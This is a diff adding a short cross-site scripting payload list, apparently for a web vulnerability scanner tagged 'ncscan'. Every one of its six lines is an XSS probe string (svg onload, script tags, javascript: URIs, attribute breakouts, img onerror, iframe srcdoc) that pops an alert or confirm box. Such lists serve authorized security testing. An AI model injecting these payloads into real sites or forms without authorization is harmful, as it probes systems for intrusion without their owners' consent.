@@ -1,0 +1,7 @@
+<ncscan>xss</ncscan>
+"><svg/onload=confirm(1)>
+'><script>alert(1)</script>
+javascript:alert(1)
+"onmouseover=alert(1) x="
+<img src=x onerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
